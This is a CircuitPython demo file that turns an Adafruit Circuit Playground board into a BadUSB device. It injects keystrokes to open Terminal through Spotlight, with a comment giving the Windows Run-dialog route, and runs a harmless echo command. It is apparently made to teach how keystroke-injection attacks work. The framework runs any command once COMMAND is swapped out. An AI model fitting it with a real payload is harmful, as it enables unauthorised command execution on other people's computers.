"""06 - Keystroke injection basics.

The minimal BadUSB: no lights, no siren -- just the keystrokes. Opens Terminal
via Spotlight and types a harmless `echo`. This is what the attack actually is,
stripped of demo 01's theatrics.

Single-file + memory-lean: adafruit_hid is imported only at fire time.

ARM:     slide the switch to the left. Fires once; toggle off/on to repeat.
PAYLOAD: 100% harmless -- opens Terminal (macOS) and echoes a line.
"""

import gc
import time
from adafruit_circuitplayground import cp

# A real payload would run a command here. This one just prints a line.
COMMAND = 'echo "A $25 board just ran this. Imagine if it were malicious."'


def payload():
    gc.collect()
    import usb_hid
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keycode import Keycode
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
    time.sleep(2)  # let USB enumerate

    # (Windows: kbd.send(Keycode.WINDOWS, Keycode.R); type "cmd"; ENTER.)
    kbd.send(Keycode.GUI, Keycode.SPACE)   # Spotlight
    time.sleep(0.6)
    layout.write("Terminal")
    time.sleep(0.4)
    kbd.send(Keycode.ENTER)
    time.sleep(1.8)                        # wait for Terminal to open
    layout.write(COMMAND)
    kbd.send(Keycode.ENTER)
    cp.pixels.fill((0, 40, 0))
    time.sleep(0.5)
    cp.pixels.fill((0, 0, 0))


fired = False
while True:
    if cp.switch:
        if not fired:
            payload()
            fired = True
    else:
        fired = False
        cp.pixels.brightness = 0.1
        cp.pixels.fill((10, 10, 0))
    time.sleep(0.1)
